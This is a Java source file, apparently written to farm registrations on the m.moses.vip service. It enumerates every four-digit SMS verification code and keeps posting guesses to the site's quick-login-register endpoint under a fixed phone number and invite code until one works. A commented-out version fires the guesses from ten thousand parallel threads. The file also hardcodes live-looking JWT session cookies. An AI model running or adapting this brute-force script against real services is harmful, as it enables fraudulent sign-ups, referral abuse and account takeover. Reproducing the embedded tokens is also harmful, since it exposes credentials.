package com;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONObject;
import com.yichen.cosmos.cloud.platform.util.HttpsUtils;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import java.util.*;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

/**
 * @Author:thomas su
 * @Date: 2018/8/3 14:56
 * @Description:
 */
public class ShuaTaiLian {
    private static final Logger logger = LoggerFactory.getLogger(ShuaTaiLian.class);

    private static final List<String> phoneCodes = new ArrayList<>();
    private static final Map<String,String> headers = new HashMap<>();
    private static final ExecutorService fixedThreadPool = Executors.newFixedThreadPool(10000);
    private static final String phone = "13757173910";
    private static final String appId = "uc1d9841b7b7c6c8b1";
    private static final String usage = "QUICK_LOGIN_REGISTER";
    private static final String inviteCode = "TAEXFH";

    static{
        for(int phoneCode = 1; phoneCode< 10000; phoneCode++){
            int i = 4 - String.valueOf(phoneCode).length();
            StringBuffer inviteCodeBuf = new StringBuffer();
            while(i > 0){
                inviteCodeBuf.append("0");
                i--;
            }
            inviteCodeBuf.append(phoneCode);
            phoneCodes.add(inviteCodeBuf.toString());
        }

        headers.put("Cookie","token=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJkOWU1YTFhMDA3MTg0MmM0OGU3NDNhNGQxODBkMjA5YyIsImF1ZCI6WyJ1YzFkOTg0MWI3YjdjNmM4YjEiLCJ1Y2VudGVyIl0sImlfdiI6MTUzMzI3NDkwODAwMCwiaWRlbnRfaWQiOjk1MDE2MTIsIm5iZiI6MTUzMzI4MjA2MiwicF92IjoxNTMzMjc0OTA4MDAwLCJpc3MiOiJ1Y2VudGVyIiwiZXhwIjoxNTMzNTQxMjYyLCJ0eXBlIjoxLCJpYXQiOjE1MzMyODIwNjIsImp0aSI6Ijg3MDQ4NDAifQ.c7W24QfvBjWg5CQg8Yo0e69JZDamELSnF8togtnl-l-LtoToUKwBy3-oXBx0JFevkOI-yLuV2yFngyRXhbRM7ihxJmoDN1rrH6yfWoHFvBpv-W1HmThhMpmCi98NhgxZze_sB3dtI2P7gC1n_ekICbhUqJTOmcgMbfl02JOO0DE");


    }

    //GET
    private static final String existsUrl = "https://m.moses.vip/foundation-user/user/phone_18801424045/exists?appId=uc1d9841b7b7c6c8b1";
    //POST
    private static final String sendCodeUrl = "https://m.moses.vip/foundation-user/mock/send_code";
    //POST
    private static final String quickLoginRegisterUrl = "https://m.moses.vip/foundation-user/login/quick_login_register";


    //Cookie
//    token=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJkYzc3NDY5MjViMzU0NDAwOTczNTI1NjhmZGFhZjJkYiIsImF1ZCI6WyJ1YzFkOTg0MWI3YjdjNmM4YjEiLCJ1Y2VudGVyIl0sImlfdiI6MTUzMzI3NTIzMzAwMCwiaWRlbnRfaWQiOjk1MDMyMjEsIm5iZiI6MTUzMzI3NTIzMywicF92IjoxNTMzMjc1MjMzMDAwLCJpc3MiOiJ1Y2VudGVyIiwiZXhwIjoxNTMzMzYxNjMzLCJ0eXBlIjoxLCJpYXQiOjE1MzMyNzUyMzMsImp0aSI6Ijg2Mzc4MDkifQ.ysV8CPlDFRKm9jf0XhbYHtOv5hPi6Qgg1kQKpIv-HlpaYVvOn9XdcSopAybxmDW2zOj4NCkGltVpMhdXtmytN92MzRyqz7iq6ekkclyIpSb7cmooz46RQm-QF_DWsLCmVZEBePRuzXLUxE_uS9dpkJtyNzh344axh4CLsOxDVjQ


    public static void main(String [] args) throws Exception{
//        System.out.println(inviteCodes);


        //第一个接口：=======================
//        boolean existsUrlGet_result = existsUrlGet(phone,headers);
//        logger.info("第一接口：验证是否存在，phone:{},existsUrlGet_result：{}",phone,existsUrlGet_result);

        //第二个接口：=======================
//        boolean sendCode_result = sendCodePost(phone,appId,usage);
//        logger.info("第二接口：验证发送验证码，phone:{},sendCode_result：{}",phone,sendCode_result);
//        Thread.sleep(10*1000);


        //第三个接口：=======================
        quickLoginRegisterPost(phone,appId,inviteCode);


    }

    public static boolean existsUrlGet(String phone,Map<String,String> headers){
        String url = "https://m.moses.vip/foundation-user/user/phone_"+phone+"/exists?appId=uc1d9841b7b7c6c8b1";
        String result = HttpsUtils.doGetWithHeader(url,headers);
        JSONObject obj = JSON.parseObject(result);
        if("200".equals(obj.getString("code"))){
            logger.info("号码："+phone +" 【存在】结果：{}",obj.getString("body"));
            return true;
        }
        return false;
    }

    public static boolean sendCodePost(String phone,String appId, String usage){
        Map<String,String> params = new HashMap<>();
        params.put("phone",phone);
        params.put("appId",appId);
        params.put("usage",usage);

        String url = "https://m.moses.vip/foundation-user/mock/send_code";
        String result = HttpsUtils.doPostWithHeader(url,JSON.toJSONString(params),headers);
        JSONObject obj = JSON.parseObject(result);
        if("200".equals(obj.getString("code"))){
            logger.info("号码："+phone +" 【发送验证码】结果：成功");
            return true;
       }
        return false;

    }

    public static void quickLoginRegisterPost(String phone,String appId, String inviteCode){
        Map<String,String> params = new HashMap<>();
        params.put("phone",phone);
        params.put("appId",appId);
        params.put("inviteCode",inviteCode);

        String url = "https://m.moses.vip/foundation-user/login/quick_login_register";

   /*     phoneCodes.parallelStream().forEach(item->{
            params.put("phoneCode",item);
            fixedThreadPool.submit(new Runnable() {
                @Override
                public void run() {
                    String result = HttpsUtils.doPostWithHeader(url,JSON.toJSONString(params),headers);
                    logger.info("{}",result);
                    JSONObject obj = JSON.parseObject(result);
                    if("200".equals(obj.getString("code"))){
                        logger.info("号码："+phone +" 【！！！！！注册！！！！！】结果：成功");
                    }
                }
            });
        });*/

            params.put("phoneCode",phoneCodes.get(new Random().nextInt(phoneCodes.size())));
            logger.info("参数：params：{}",params);
            String result = HttpsUtils.doPostWithHeader(url,JSON.toJSONString(params),headers);
            logger.info("尝试结果：{}",result);
            JSONObject obj = JSON.parseObject(result);
            int times = 1;
            while(!"200".equals(obj.getString("code")) && !"205710b5ba98668c953".equals(obj.getString("code"))){
                params.put("phoneCode",phoneCodes.get(new Random().nextInt(phoneCodes.size())));
                logger.info("参数：params：{}",params);
                result = HttpsUtils.doPostWithHeader(url,JSON.toJSONString(params),headers);
                logger.info("尝试结果：{}",result);
                obj = JSON.parseObject(result);
                times ++;
            }

            logger.info("一个验证码尝试总次数：times:{}",times);
            if("200".equals(obj.getString("code"))){
                logger.info("号码："+phone +" 【！！！！！注册！！！！！】结果：成功");
            }
    }

}
